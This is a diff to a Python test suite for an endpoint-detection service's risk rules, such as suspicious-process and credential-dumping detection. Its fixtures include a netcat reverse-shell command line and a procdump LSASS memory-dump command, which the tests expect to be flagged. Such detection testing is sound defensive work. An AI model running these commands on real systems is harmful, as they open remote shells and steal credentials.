@@ -1,19 +1,19 @@
 import pytest
 from unittest.mock import AsyncMock, MagicMock
-from app.services.risk_rules import create_default_registry
-from app.services.risk_rules.cpu_spike_rule import CpuSpikeRule
-from app.services.risk_rules.suspicious_process_rule import SuspiciousProcessRule
-from app.services.risk_rules.network_connection_rule import NetworkConnectionRule
-from app.services.risk_rules.file_changes_rule import FileChangesRule
-from app.services.risk_rules.process_chain_rule import ProcessChainRule
-from app.services.risk_rules.injection_rule import InjectionRule
-from app.services.risk_rules.living_off_land_rule import LivingOffLandRule
-from app.services.risk_rules.registry_rule import RegistryRule
-from app.services.risk_rules.credential_dumping_rule import CredentialDumpingRule
-from app.services.risk_rules.shadow_copy_rule import ShadowCopyRule
-from app.services.risk_rules.c2_communication_rule import C2CommunicationRule
-from app.services.risk_rules.lateral_movement_rule import LateralMovementRule
-from app.services.risk_rules.mass_file_modification_rule import MassFileModificationRule
+from app.services.detection.risk_rules import create_default_registry
+from app.services.detection.risk_rules.cpu_spike_rule import CpuSpikeRule
+from app.services.detection.risk_rules.suspicious_process_rule import SuspiciousProcessRule
+from app.services.detection.risk_rules.network_connection_rule import NetworkConnectionRule
+from app.services.detection.risk_rules.file_changes_rule import FileChangesRule
+from app.services.detection.risk_rules.process_chain_rule import ProcessChainRule
+from app.services.detection.risk_rules.injection_rule import InjectionRule
+from app.services.detection.risk_rules.living_off_land_rule import LivingOffLandRule
+from app.services.detection.risk_rules.registry_rule import RegistryRule
+from app.services.detection.risk_rules.credential_dumping_rule import CredentialDumpingRule
+from app.services.detection.risk_rules.shadow_copy_rule import ShadowCopyRule
+from app.services.detection.risk_rules.c2_communication_rule import C2CommunicationRule
+from app.services.detection.risk_rules.lateral_movement_rule import LateralMovementRule
+from app.services.detection.risk_rules.mass_file_modification_rule import MassFileModificationRule
 
 pytestmark = pytest.mark.asyncio
 
@@ -115,21 +115,38 @@ async def test_suspicious_process_rule_temp_directory():
     assert "miner" in reason2
 
 
-async def test_suspicious_process_rule_outbound_network():
+async def test_suspicious_process_rule_outbound_network_no_fp():
     rule = SuspiciousProcessRule()
     context = {}
-    # Process with PID correlating to an outbound connection
+    # Legitimate processes like Code.exe and explorer.exe with outbound network connections must NOT trigger FP
     telemetry = {
         "process_list": [
-            {"pid": 9999, "name": "custom_agent", "exe": "/usr/bin/custom_agent"}
+            {"pid": 1111, "name": "Code.exe", "cmdline": "Code.exe --ms-enable-electron-run-as-node", "exe": "C:\\Program Files\\VS Code\\Code.exe"},
+            {"pid": 2222, "name": "explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "exe": "C:\\Windows\\explorer.exe"},
+            {"pid": 3333, "name": "sync.exe", "cmdline": "C:\\Windows\\System32\\sync.exe", "exe": "C:\\Windows\\System32\\sync.exe"},
         ],
         "network_connections": [
-            {"pid": 9999, "dst_ip": "203.0.113.5", "dst_port": 8080, "status": "ESTABLISHED"}
+            {"pid": 1111, "dst_ip": "20.189.173.1", "dst_port": 443, "status": "ESTABLISHED"},
+            {"pid": 2222, "dst_ip": "192.168.30.1", "dst_port": 445, "status": "ESTABLISHED"}
         ]
     }
     score, reason = await rule.evaluate(telemetry, context)
-    assert score == 25.0
-    assert "custom_agent" in reason
+    assert score == 0.0
+    assert reason == ""
+
+
+async def test_suspicious_process_rule_nc_reverse_shell():
+    rule = SuspiciousProcessRule()
+    context = {}
+    # nc.exe -e cmd reverse shell should trigger high severity score >= 50
+    telemetry = {
+        "process_list": [
+            {"name": "nc.exe", "cmdline": "nc.exe -e cmd.exe 192.168.30.104 4444", "exe": "C:\\Users\\Public\\nc.exe"}
+        ]
+    }
+    score, reason = await rule.evaluate(telemetry, context)
+    assert score >= 50.0
+    assert "nc.exe" in reason
 
 
 async def test_suspicious_process_rule_blacklist_nc_word_boundary():
@@ -142,7 +159,7 @@ async def test_suspicious_process_rule_blacklist_nc_word_boundary():
         ]
     }
     score, reason = await rule.evaluate(telemetry, context)
-    assert score == 25.0
+    assert score >= 25.0
     assert "nc" in reason
 
     # 'sync' or 'async' should NOT trigger 'nc'
@@ -250,6 +267,33 @@ async def test_credential_dumping_rule():
 
     score, reason = await rule.evaluate(telemetry, {})
     assert score > 0.0
+    assert "Credential dumping activity detected" in reason
+
+
+async def test_credential_dumping_rule_normal_lsass_no_fp():
+    rule = CredentialDumpingRule()
+    # Normal Windows lsass process with empty cmdline or system path
+    telemetry = {
+        "process_list": [
+            {"name": "lsass.exe", "cmdline": ""},
+            {"name": "lsass.exe", "cmdline": "C:\\Windows\\system32\\lsass.exe"},
+            {"name": "svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch"},
+        ]
+    }
+    score, reason = await rule.evaluate(telemetry, {})
+    assert score == 0.0
+    assert reason == ""
+
+
+async def test_credential_dumping_rule_procdump():
+    rule = CredentialDumpingRule()
+    telemetry = {
+        "process_list": [
+            {"name": "procdump.exe", "cmdline": "procdump.exe -ma lsass.exe lsass.dmp"}
+        ]
+    }
+    score, reason = await rule.evaluate(telemetry, {})
+    assert score >= 80.0
     assert "Credential dumping activity detected" in reason
 
 
